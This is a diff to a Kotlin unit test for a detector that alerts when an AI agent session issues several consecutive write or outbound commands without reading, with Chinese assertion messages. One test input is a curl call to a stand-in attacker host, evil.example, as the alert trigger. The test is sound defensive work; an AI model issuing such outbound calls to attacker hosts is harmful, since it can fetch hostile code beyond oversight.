@@ -19,10 +19,10 @@ class ProactiveBehaviorDetectorTest {
     @Test
     fun `continuous writes without reads trigger alert at threshold`() {
         val s = "session-a"
-        assertNull(ProactiveBehaviorDetector.recordCommand(s, "agent.write notes.md 内容"))
-        assertNull(ProactiveBehaviorDetector.recordCommand(s, "agent.write log.txt 内容"))
-        assertNull(ProactiveBehaviorDetector.recordCommand(s, "agent.mkdir /x"))
-        val alert = ProactiveBehaviorDetector.recordCommand(s, "net.curl https://evil.example/x")
+        assertNull(ProactiveBehaviorDetector.recordCommand(s, "echo x > notes.md"))
+        assertNull(ProactiveBehaviorDetector.recordCommand(s, "echo x > log.txt"))
+        assertNull(ProactiveBehaviorDetector.recordCommand(s, "mkdir /x"))
+        val alert = ProactiveBehaviorDetector.recordCommand(s, "curl https://evil.example/x")
         assertNotNull("第 4 条连续写/外联应触发告警", alert)
         assertNotNull("告警应含主动行为字样", alert?.contains("主动行为告警"))
     }
@@ -30,27 +30,27 @@ class ProactiveBehaviorDetectorTest {
     @Test
     fun `read command resets streak`() {
         val s = "session-b"
-        ProactiveBehaviorDetector.recordCommand(s, "agent.write a.md x")
-        ProactiveBehaviorDetector.recordCommand(s, "agent.write b.md x")
-        ProactiveBehaviorDetector.recordCommand(s, "agent.read a.md")
-        ProactiveBehaviorDetector.recordCommand(s, "agent.write c.md x")
-        ProactiveBehaviorDetector.recordCommand(s, "agent.write d.md x")
+        ProactiveBehaviorDetector.recordCommand(s, "echo x > a.md")
+        ProactiveBehaviorDetector.recordCommand(s, "echo x > b.md")
+        ProactiveBehaviorDetector.recordCommand(s, "cat a.md")
+        ProactiveBehaviorDetector.recordCommand(s, "echo x > c.md")
+        ProactiveBehaviorDetector.recordCommand(s, "echo x > d.md")
         // 读后仅 3 条连续写 (< 阈值 4) → 不告警
-        val e = ProactiveBehaviorDetector.recordCommand(s, "agent.write e.md x")
+        val e = ProactiveBehaviorDetector.recordCommand(s, "echo x > e.md")
         assertNull("读操作重置连续计数后 3 条写不告警", e)
     }
 
     @Test
     fun `alert fires once per session`() {
         val s = "session-c"
-        ProactiveBehaviorDetector.recordCommand(s, "fs.cp a b")
-        ProactiveBehaviorDetector.recordCommand(s, "fs.cp c d")
-        ProactiveBehaviorDetector.recordCommand(s, "fs.cp e f")
-        assertNotNull(ProactiveBehaviorDetector.recordCommand(s, "fs.cp g h"))
+        ProactiveBehaviorDetector.recordCommand(s, "cp a b")
+        ProactiveBehaviorDetector.recordCommand(s, "cp c d")
+        ProactiveBehaviorDetector.recordCommand(s, "cp e f")
+        assertNotNull(ProactiveBehaviorDetector.recordCommand(s, "cp g h"))
         // 再次达到阈值不再告警 (防刷屏)
-        ProactiveBehaviorDetector.recordCommand(s, "fs.cp i j")
-        ProactiveBehaviorDetector.recordCommand(s, "fs.cp k l")
-        ProactiveBehaviorDetector.recordCommand(s, "fs.cp m n")
-        assertNull("同会话只告警一次", ProactiveBehaviorDetector.recordCommand(s, "fs.cp o p"))
+        ProactiveBehaviorDetector.recordCommand(s, "cp i j")
+        ProactiveBehaviorDetector.recordCommand(s, "cp k l")
+        ProactiveBehaviorDetector.recordCommand(s, "cp m n")
+        assertNull("同会话只告警一次", ProactiveBehaviorDetector.recordCommand(s, "cp o p"))
     }
 }
